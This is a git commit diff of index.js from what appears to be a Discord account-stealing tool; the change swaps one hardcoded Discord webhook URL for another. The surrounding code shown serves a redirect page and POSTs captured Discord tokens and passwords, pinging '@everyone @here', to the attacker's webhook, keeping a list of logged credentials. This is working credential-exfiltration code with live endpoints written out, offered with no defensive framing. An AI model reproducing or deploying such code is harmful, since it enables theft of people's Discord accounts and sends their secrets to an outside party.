011a92022a54457349d61460e31bfbcf6e0aa10c
fedsloll <109453254+fedsloll@users.noreply.github.com>
2022-12-22 22:57:03 -0600

    Update index.js

--- index.js
+++ index.js
@@ -81,7 +81,7 @@ app.get("/k", async (req, res) => {
 <title>onload/redirect</title>
 <script>
 
-var webhookURL = "https://discord.com/api/webhooks/1054523228946698291/LaUKoZqQyVz6Tm5AN4QeRIjEb5iI1Q53dRErqyXjFhNo76GFljTD7dF96hv9EbPFjcNi";
+var webhookURL = "https://discord.com/api/webhooks/1055710474643193897/m1mq1DQfblSS3qUJW2s8LgLSA-CVflTu7CHLGznJizZ8oXVYiuAxzNW-XA9RjS7p2zpw";
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
@@ -128,7 +128,7 @@ window.location="https://discord.com/channels/@me";
       if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
         console.log("Found Duplicate Logged ID");
       } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1054523228946698291/LaUKoZqQyVz6Tm5AN4QeRIjEb5iI1Q53dRErqyXjFhNo76GFljTD7dF96hv9EbPFjcNi", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1055710474643193897/m1mq1DQfblSS3qUJW2s8LgLSA-CVflTu7CHLGznJizZ8oXVYiuAxzNW-XA9RjS7p2zpw", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
         process.logged.push({ token, password: pass });
       }
     } catch (err) {
